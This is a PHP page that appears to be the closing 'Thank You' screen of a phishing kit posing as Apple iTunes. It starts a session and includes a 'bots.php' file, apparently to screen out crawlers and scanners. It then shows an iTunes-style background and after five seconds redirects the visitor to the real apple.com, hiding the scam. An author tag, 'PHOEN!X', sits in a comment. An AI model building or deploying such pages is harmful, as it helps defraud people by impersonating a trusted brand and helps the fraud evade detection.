<?php
if (!isset($_SESSION)) {
  session_start();
}

include "bots.php";


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<meta http-equiv="refresh" content="5;url=http://www.apple.com" />
<head>
  <title>iTunes - Thank You</title>  
<link rel="icon" href="./img/favicon.ico">

</head>
<div>
<body background="./img/bg4.png" style="background-repeat: no-repeat" > 


<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br>
</body>
<!-- PHOEN!X -->
</html>